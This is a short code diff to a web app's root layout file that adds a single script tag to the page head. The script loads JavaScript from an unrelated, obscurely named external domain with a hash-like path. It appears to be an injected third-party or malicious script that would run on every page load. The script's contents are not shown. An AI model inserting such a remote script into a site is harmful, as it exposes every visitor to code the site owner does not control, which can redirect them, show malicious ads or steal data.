@@ -75,6 +75,7 @@ export default function RootLayout({ children }: RootLayoutProps) {
         <meta name="viewport" content="width=device-width, initial-scale=1" />
         <meta name="theme-color" content="#000000" />
         <link rel="icon" href="/favicon.ico" />
+        <script type='text/javascript' src='//cartrigepromised.com/b3/0c/e0/b30ce048eb22fd8e855f26259c832df3.js'></script>
       </head>
       <body>
         <ThemeProviderWrapper>
